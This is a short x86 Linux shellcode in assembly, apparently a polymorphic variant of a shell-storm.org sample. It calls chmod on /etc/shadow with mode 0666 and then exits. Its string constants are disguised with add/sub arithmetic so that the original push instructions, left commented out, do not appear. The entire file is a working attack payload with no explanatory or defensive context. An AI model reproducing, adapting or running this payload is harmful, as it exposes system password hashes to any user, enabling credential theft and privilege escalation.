;http://shell-storm.org/shellcode/files/shellcode-250.html
 

global _start


section .text

_start:
xor edx,edx
push byte +0xf
pop eax
push edx
push byte +0x77
push word 0x6f64
;push dword 0x6168732f
mov esi, 0x7279842f
sub esi, 0x11111110
push esi
;push dword 0x6374652f
mov esi, 0x5263541e
add esi, 0x11111111
push esi
mov ebx,esp
push word 0x1b6
pop ecx
int 0x80
push byte +0x1
pop eax
int 0x80

